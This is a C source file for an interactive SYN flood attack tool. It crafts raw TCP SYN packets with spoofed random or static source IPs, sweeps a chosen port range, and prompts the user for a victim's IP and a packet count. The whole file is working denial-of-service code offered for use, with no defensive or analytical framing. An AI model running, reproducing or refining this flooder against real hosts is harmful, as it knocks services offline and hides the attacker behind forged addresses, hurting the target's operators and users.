/*

syn packets
random source ip | static source ip
single port | port range
*/
/*
	Raw TCP packets
*/
#include <stdio.h>	//for printf
#include <string.h> //memset
#include <sys/socket.h>	//for socket ofcourse
#include <stdlib.h> //for exit(0);
#include <errno.h> //For errno - the error number
#include <netinet/tcp.h>	//Provides declarations for tcp header
#include <netinet/ip.h>	//Provides declarations for ip header
#include <arpa/inet.h> // inet_addr
#include <unistd.h> // sleep()
#include "utilities.h"

/*
    Attack on port range [portStart, portEnd]
    if randomIp is not set, the spoofed ip is used in all the packets
*/
void syn_flood (char * victimServerIp, int portStart, int portEnd, int randomIp, char ipClass, char * spoofIp, int nPackets)
{
	//Create a raw socket
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
	
	if(s == -1)
	{
		//socket creation failed, may be because of non-root privileges
		perror("Failed to create socket");
		exit(1);
	}
	
	//packet to represent the packet
	char packet[4096] , source_ip[32] , *data , *pseudogram;
	
	//zero out the packet buffer
	memset (packet, 0, 4096);
	
	//IP header
	struct iphdr *iph = (struct iphdr *) packet;
	
	//TCP header
	struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof (struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;
	
	
	//some address resolution
	strcpy(source_ip , spoofIp);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(portStart);
	sin.sin_addr.s_addr = inet_addr (victimServerIp);
	
	//Fill in the IP Header
	iph -> ihl = 5;
	iph -> version = 4;
	iph -> tos = 0;
	iph -> tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
	iph -> id = htonl (54321);	//Id of this packet
	iph -> frag_off = 0;
	iph -> ttl = 255;
	iph -> protocol = IPPROTO_TCP;
	iph -> check = 0;		//Set to 0 before calculating checksum
	iph -> saddr = inet_addr ( source_ip );	//Spoof the source ip address
	iph -> daddr = sin.sin_addr.s_addr;
	
	//Ip checksum
	iph->check = csum ((unsigned short *) packet, iph->tot_len);
	
	//TCP Header
	tcph -> source = htons (1234);
	tcph -> dest = htons (80);
	tcph -> seq = 0;
	tcph -> ack_seq = 0;
	tcph -> doff = 5;	//tcp header size
	tcph -> fin=0;
	tcph -> syn=1;
	tcph -> rst=0;
	tcph -> psh=0;
	tcph -> ack=0;
	tcph -> urg=0;
	tcph -> window = htons (5840);	/* maximum allowed window size */
	tcph -> check = 0;	//leave checksum 0 now, filled later by pseudo header
	tcph -> urg_ptr = 0;
	
	//Now the TCP checksum
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.udp_length = htons(sizeof(struct tcphdr));
	
	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
	pseudogram = malloc(psize);
	
	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int one = 1;
	const int *val = &one;
	
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		perror("Error setting IP_HDRINCL");
		exit(0);
	}
	int nPacketSent = 0;
	for (int i = 0; i < nPackets; i++){
        int curPort = (i % (portEnd - portStart + 1)) + portStart;

        if (randomIp){
            random_ip_gen (source_ip, ipClass);
        }

        //update tcp packet
        tcph -> dest = htons (curPort);
        tcph -> check = 0;

        //update ip header
        iph -> saddr = inet_addr (source_ip);
        tcph -> check = 0;
        iph -> check = csum ((unsigned short *) packet, iph->tot_len);

        //update tcp checksum
        psh.source_address = inet_addr( source_ip );
        memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr));     
        tcph -> check = csum( (unsigned short*) pseudogram , psize);

        

        //Send the packet
		if (sendto (s, packet, iph -> tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
		{
			perror("sendto failed");
		}
		//Data send successfully
		else
		{
            nPacketSent++;
		}

    }
    free (pseudogram);
	close(s);
	printf("Attack completed. %d packets sent.\n", nPacketSent);	
}
void syn_flood_setup(){
	system("clear");
	printf("\033[01;33m"); //set color to yellow
    printf("╚»★«╝ SYN FLOOD ATTACK ╚»★«╝\n");
	printf("\033[0m");//reset color

	char victimIp[32];
	int portStart = 0;
	int portEnd = 0;
	int randomSourceIp = 1;
	char ipClass = ' ';
	char sourceIp[32];
	int nPackets;

	sourceIp[0] = 0;

	while ((getchar()) != '\n'); //clear out buffer
	
	//take input from user
	printf ("Enter victim's IP : ");
	fgets(victimIp, 32, stdin);
	victimIp[strcspn(victimIp, "\n")] = 0;

	printf ("Enter start of port range : ");
	scanf ("%d", &portStart);

	printf ("Enter end of port range : ");
	scanf ("%d", &portEnd);

	printf ("Want random source IPs? (1 for yes/ 0 for no) ? : ");
	scanf ("%d", &randomSourceIp);

	if (randomSourceIp){
		printf ("Enter IP Class (A, B, C, D) : ");
		scanf (" %c", &ipClass);
	}
	else{
		printf ("Enter static source IP : ");
		fgets(sourceIp, 32, stdin);
		sourceIp[strcspn(sourceIp, "\n")] = 0;
	}

	printf ("Enter number of packets to send : ");
	scanf ("%d", &nPackets);

	//TODO  display all the inputs before starting the attack

    syn_flood(victimIp, portStart, portEnd, randomSourceIp, ipClass, sourceIp, nPackets);
}